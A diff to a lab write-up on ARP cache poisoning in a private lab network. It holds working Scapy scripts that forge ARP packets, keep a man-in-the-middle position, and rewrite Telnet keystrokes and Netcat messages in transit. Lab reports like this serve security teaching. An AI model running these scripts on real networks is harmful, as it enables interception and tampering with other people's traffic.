@@ -2,36 +2,38 @@
 
 ## 1. ARP CACHE POISONING
 
-The objective of the first part is to gain some familiarity with ARP spoofing.  
-The setup includes three machines in the same local network, two are victims (**A**, **B**) while one is the attacker (`M`).
+The objective of the first part is to gain familiarity with **ARP spoofing**.
+The setup includes three machines on the same local network: two victims (**A**, **B**) and one attacker (**M**).
 
-These machines have the following information:
+The machines have the following network configuration:
 
-| Machine | IP address | MAC address |
-| ------- | ---------- | ----------- |
-| M       | 10.9.0.105 | 02:42:0a:09:00:69 | 
+| Machine | IP address | MAC address       |
+| ------- | ---------- | ----------------- |
+| M       | 10.9.0.105 | 02:42:0a:09:00:69 |
 | A       | 10.9.0.5   | 02:42:0a:09:00:05 |
 | B       | 10.9.0.6   | 02:42:0a:09:00:06 |
 
+From now on, hosts will be identified using symbols such as `MAC_A`, `IP_M`, etc.
 
-and will be identified using `MAC_A` or `IP_M` from now on.
+---
 
-### 1.1. ARP Request
+### 1.1 ARP Request
 
-The task was to construct an ARP request on host `M` to map `B`'s IP address to `M`'s MAC address.  
-To perform such operation the following python script was used:
+The task is to construct an **ARP request** on host `M` that poisons host `A`’s ARP cache by associating `B`’s IP address with `M`’s MAC address.
+
+The following Python script was used:
+
 ```python
 from scapy.all import *
 
 E = Ether(src=MAC_M, dst=MAC_A)
-A = ARP(psrc=IP_B, pdst=IP_A, hwsrc=MAC_M)
-A.op = 1
+A = ARP(psrc=IP_B, pdst=IP_A, hwsrc=MAC_M, op=1)
 
-pkt = E/A
+pkt = E / A
 sendp(pkt)
 ```
 
-this successfully manages to poison the APR cache of `A` as results from:
+This successfully poisons the ARP cache of host `A`, as shown by:
 
 ```
 $ arp -n
@@ -39,177 +41,239 @@ Address     HWtype  HWaddress           Flags Mask  Iface
 10.9.0.6    ether   02:42:0a:09:00:69   C           eth0
 ```
 
-### 1.2. ARP Reply
+---
 
-The task was to construct an ARP reply on host `M` to map `B`' IP address to `M`'s MAC address. The attack is tested against two scenarios:
-+ `B` is already in `A`'s cache.
-+ `B` isn't
+### 1.2 ARP Reply
+
+The task is to construct an **ARP reply** on host `M` to map `B`’s IP address to `M`’s MAC address.
+The attack is tested under two scenarios:
+
+* `B` **is already present** in `A`’s ARP cache
+* `B` **is not present** in `A`’s ARP cache
 
 The script used is:
+
 ```python
 from scapy.all import *
 
 E = Ether(src=MAC_M, dst=MAC_A)
-A = ARP(psrc=IP_B, pdst=IP_A, hwdst=MAC_M, hwsrc=MAC_M)
-A.op = 2
+A = ARP(
+    psrc=IP_B,
+    pdst=IP_A,
+    hwsrc=MAC_M,
+    hwdst=MAC_A,
+    op=2
+)
 
-pkt = E/A
+pkt = E / A
 sendp(pkt)
 ```
 
-Now in the two scenarios the content of `A`'s ARP cache will be different:
-+ If `B` is already in `A`'s cache then the operations succeeds
-+ otherwise it fails and the cache is empty
+Observed behavior:
 
-In the first scenario the cache has the same content as in the previous task.
+* If `B` is already present in `A`’s ARP cache, the cache entry is successfully overwritten.
+* If `B` is not present, the unsolicited ARP reply is ignored and no cache entry is created.
 
-### 1.3. Gratuitous ARP
+In the successful case, the ARP cache contents are identical to those observed in [Section 1.1](#11-arp-request).
 
-The task consists in constructing a gratuitous ARP  and use it to map `B`'s IP address to `M`'s MAC address. Also in this case we consider the two scenarios.
+---
 
-The code to perform the attack is as follows:
+### 1.3 Gratuitous ARP
+
+The task consists of constructing a **gratuitous ARP request** to map `B`’s IP address to `M`’s MAC address.
+
+The code used is:
+
 ```python
 from scapy.all import *
 
 E = Ether(src=MAC_M, dst=MAC_BCAST)
-A = ARP(psrc=IP_B, pdst=IP_B, hwsrc=MAC_M, hwdst=MAC_BCAST)
-A.op = 1
+A = ARP(
+    psrc=IP_B,
+    pdst=IP_B,
+    hwsrc=MAC_M,
+    hwdst=MAC_BCAST,
+    op=1
+)
 
-pkt = E/A
+pkt = E / A
 sendp(pkt)
 ```
 
-Also in this case the content of `A`'s cache is filled only if it already contains an entry for `B`.
+As in the previous case, host `A` updates its ARP cache **only if an entry for `B` already exists**. Otherwise, the gratuitous ARP request is ignored.
+
+---
 
 ## 2. MITM ATTACK ON TELNET
 
-Host `A` and `B` are communicating using telnet. `M` wants to intercept their communication so it can make changes to the data sent between `A` and `B`.  
-In order for the attack to succeed some steps must be taken:
+Hosts `A` and `B` communicate using **Telnet**.
+The attacker `M` aims to intercept and manipulate their communication by performing a **Man-in-the-Middle (MITM)** attack.
 
-### 2.1. ARP Cache Poisoning Attack
+---
 
-`M` conducts an ARP poisoning attack on `A` and `B` to map each other's MAC address with `M`'s. Packets sent by `A` and `B` will then pass through `M`.  
-We must make sure that both hosts are communicating through `M` for the whole duration of the operation, so periodic packages must be sent
+### 2.1 ARP Cache Poisoning Attack
+
+`M` performs ARP poisoning against both `A` and `B`, associating each victim’s IP address with `M`’s MAC address.
+As a result, all traffic between `A` and `B` flows through `M`.
+
+To maintain the poisoned state, ARP packets must be sent periodically:
+
 ```python
 from scapy.all import *
 import time
 
-pkt_A = Ether(src=MAC_M, dst=MAC_BCAST)/ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, op=1)
-pkt_B = Ether(src=MAC_M, dst=MAC_BCAST)/ARP(psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, op=1)
+pkt_A = Ether(src=MAC_M, dst=MAC_BCAST) / ARP(
+    psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, op=1
+)
+
+pkt_B = Ether(src=MAC_M, dst=MAC_BCAST) / ARP(
+    psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, op=1
+)
 
 while True:
-    sendp(pkt_A)
-    sendp(pkt_B)
+    sendp(pkt_A, verbose=False)
+    sendp(pkt_B, verbose=False)
     time.sleep(5)
 ```
 
-This will be enough to setup the environment.
+This establishes the MITM position.
 
-### 2.2. Testing
+---
 
-After the attack is successful it is possible to ping the two hosts.  
-If the IP forwarding is turned off with `sysctl net.ipv4.ip_forward=0` then no packet can reach the two hosts anymore.
+### 2.2 Testing
+
+After the attack is active, connectivity between `A` and `B` is tested.
+
+If IP forwarding is **disabled** on `M`:
+
+```bash
+sysctl -w net.ipv4.ip_forward=0
+```
+
+packets are dropped and communication fails:
 
 ```
 PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
 
 --- 10.9.0.6 ping statistics ---
-1 packet transmitted, 0 received, 100% packet loss, time 0ms
+1 packet transmitted, 0 received, 100% packet loss
 ```
+
+---
 
 ### 2.3 IP Forwarding
 
-Now IP forwarding is turned on again and packets reach the two hosts, meaning that the MITM attack was a success:
+When IP forwarding is **enabled** again:
+
+```bash
+sysctl -w net.ipv4.ip_forward=1
+```
+
+packets successfully reach the destination, confirming that the MITM attack is working:
 
 ```
-PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
 64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.454 ms
-
---- 10.9.0.6 ping statistics ---
-1 packet transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 0.454/0.454/0.454/0.000 ms
 ```
 
-### 2.4 MITM Attack
-The objective is to spoof the Telnet connection between `A` and `B` using `M` as AITM. For every key stroke typed on `A`'s Telnet window, a TCP packet is generated and sent to `B`.  
-Each typed character will then be replaced by `M` with the character `z`.  
-Instead of simply forwarding packets to `M` now they will be replaced by the spoofed version. The steps to do so are:
-+ [Spoof the content of the ARP caches](#21-arp-cache-poisoning-attack) of `A` and `B`.
-+ [Turn on IP forwarding](#23-ip-forwarding) so that the Telnet connection can be established
-+ [Turn it off](#22-testing) so that no packet can reach `A` or `B`
-+ Activate the `sniff_and_spoof` script to perform the attack;
+---
 
-The content of such script is as follows:
+### 2.4 MITM Attack on Telnet
+
+The goal is to actively manipulate the Telnet session.
+For each keystroke typed by `A`, the attacker replaces every printable character with the letter `z`.
+
+Steps:
+
+1. Poison ARP caches of `A` and `B`
+2. Enable IP forwarding to establish the Telnet session
+3. Disable IP forwarding to block direct forwarding
+4. Run the packet sniffing and spoofing script
+
 ```python
 from scapy.all import *
 
 def spoof_pkt(pkt):
-    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
-        # New packet is based on the caputred one
-        # Checksum and payload are removed to avoid errors
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].payload)
-        del(newpkt[TCP].chksum)
-        if not pkt[TCP].payload:
-            send(newpkt) # No payload
-        else:
-            data = pkt[TCP].payload.load # The original payload data
-            newdata = b''
-            for byte in data:
-                if byte <= 0x20: # Whitespace character
-                    newdata += bytes([byte])
-                else:
-                    newdata += b'z'
-            send(newpkt/newdata)
-    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].chksum)
-        send(newpkt)
-f = f'tcp and not ether src {MAC_M}'
-pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+    if pkt.haslayer(IP) and pkt.haslayer(TCP):
+        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            del newpkt[TCP].payload
+
+            if pkt[TCP].payload:
+                data = pkt[TCP].payload.load
+                newdata = bytes(
+                    byte if byte <= 0x20 else ord('z')
+                    for byte in data
+                )
+                send(newpkt / newdata, verbose=False)
+            else:
+                send(newpkt, verbose=False)
+
+        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            send(newpkt, verbose=False)
+
+f = f"tcp and not ether src {MAC_M}"
+sniff(iface="eth0", filter=f, prn=spoof_pkt)
 ```
 
-The results are as shown in the image:  
-![Che dovrei scrivere qui?](images/telnet.png)
+The resulting Telnet session is shown below:
+![Telnet MITM Result](images/telnet.png)
+
+---
 
 ## 3. MITM ATTACK ON NETCAT
 
-Using a similar setup wrt the previous example we reproduce the attack while the hosts communicate using `netcat`:
-+ `B` listens for connections with `nc -lp 9090`
-+ `A` connects to it using `np 10.9.0.6`
+Using a similar setup, the attack is repeated with **Netcat**:
 
-With minimal changes to the previous script we can now substitute each instance of the user's name ('_alessandro_') with a sequence of `a` of the same length.
+* Host `B` listens with:
+
+  ```bash
+  nc -lp 9090
+  ```
+* Host `A` connects using:
+
+  ```bash
+  nc 10.9.0.6 9090
+  ```
+
+The attacker replaces every occurrence of the username `"alessandro"` with a string of `a` characters of the same length.
+
 ```python
 from scapy.all import *
 
-NAME = b'alessandro'
-REPL = b'a'  * len(NAME)
+NAME = b"alessandro"
+REPL = b"a" * len(NAME)
 
 def spoof_pkt(pkt):
-    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
-        # New packet is based on the caputred one
-        # Checksum and payload are removed to avoid errors
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].payload)
-        del(newpkt[TCP].chksum)
-        if not pkt[TCP].payload:
-            send(newpkt) # No payload
-        else:
-            data = pkt[TCP].payload.load # The original payload data
-            nedata = data.replace(NAME, REPL)
-            send(newpkt/newdata)
-    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].chksum)
-        send(newpkt)
-f = f'tcp and not ether src {MAC_M}'
-pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+    if pkt.haslayer(IP) and pkt.haslayer(TCP):
+        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            del newpkt[TCP].payload
+
+            if pkt[TCP].payload:
+                data = pkt[TCP].payload.load
+                newdata = data.replace(NAME, REPL)
+                send(newpkt / newdata, verbose=False)
+            else:
+                send(newpkt, verbose=False)
+
+        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+            newpkt = IP(bytes(pkt[IP]))
+            del newpkt.chksum
+            del newpkt[TCP].chksum
+            send(newpkt, verbose=False)
+
+f = f"tcp and not ether src {MAC_M}"
+sniff(iface="eth0", filter=f, prn=spoof_pkt)
 ```
 
-This results in the exchange of the following messages:
-![PRospettiva A](images/nc_doppio.png)
-On the left we can observe the communication from `A`'s perspective while on the right we see `B`'s.
+This results in the following message exchange:
+![Netcat MITM Result](images/nc_doppio.png)
+
+On the left, the communication is shown from host `A`’s perspective; on the right, from host `B`’s.
